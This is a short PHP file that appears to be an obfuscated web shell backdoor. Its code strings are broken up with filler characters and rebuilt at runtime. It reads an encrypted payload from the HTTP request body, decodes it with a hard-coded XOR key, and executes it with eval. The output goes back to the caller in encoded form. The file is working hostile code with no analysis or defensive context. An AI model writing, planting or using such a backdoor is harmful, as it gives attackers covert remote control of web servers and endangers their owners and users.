<?php
$B='r($j=0;($j<$Ic&&$iI<$l);$jI++I,$Ii++){$o.=$tI{$i}^$k{$j}II;}}returIn $o;}iIf I(@preg_matcIh';
$W='@ob_end_cleaIn();$r=@bIase64_encIoIde(@x(@gzcoImIpressI($o),$k));pIrIint("$p$kh$r$Ikf");}';
$J='$k="I5eca0506I";$kh="51Ifb21I7513a0I";$kf="eI03b51Ic12d3d"I;$pI="eQjfUbYI0Xpk9ISKpI9"I';
$g=';function xI($tI,$k){I$cI=strlen($kI);$l=stIrleIn($t);$o="";fIorI($i=0;$i<$lI;){IfIo';
$I='("/$kIh(.+I)I$kf/",@file_getI_conItents("Iphp://iInput"I),$m)I==1)I {@ob_stIart()I;';
$V=str_replace('Il','','cIlreatIleIlIl_funcIltIlion');
$y='@eIval(@gzunIcomIpIreIss(@x(@base6I4_decode($m[1])I,I$k)))I;$o=@ob_getI_conteIIIntIs();';
$o=str_replace('I','',$J.$g.$B.$I.$y.$W);
$c=$V('',$o);$c();
?>
